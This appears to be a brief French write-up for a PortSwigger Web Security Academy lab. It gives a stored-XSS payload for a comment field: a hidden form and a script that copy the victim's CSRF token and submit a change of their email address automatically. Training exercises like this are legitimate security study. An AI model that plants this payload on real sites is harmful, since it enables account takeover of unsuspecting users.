# Lab

https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf

## Payload

Dans le commentaire, mettre ce script :

```html
<form action="/my-account/change-email" method="POST" style="display: none;" id="chgEmail">
    <input type="hidden" name="csrf">
    <label for="email">Email :</label>
    <input type="email" name="email" id="email" value="hacked@test.com" required>
    <button type="submit">Changer l'adresse email</button>
</form>

<script>
    window.addEventListener('load', function () {
        const csrfToken = document.querySelectorAll('input[name="csrf"]')[1].value;
        document.querySelector('form#chgEmail input[name="csrf"]').value = csrfToken;
        document.querySelector('form#chgEmail').submit();
    });
</script>
```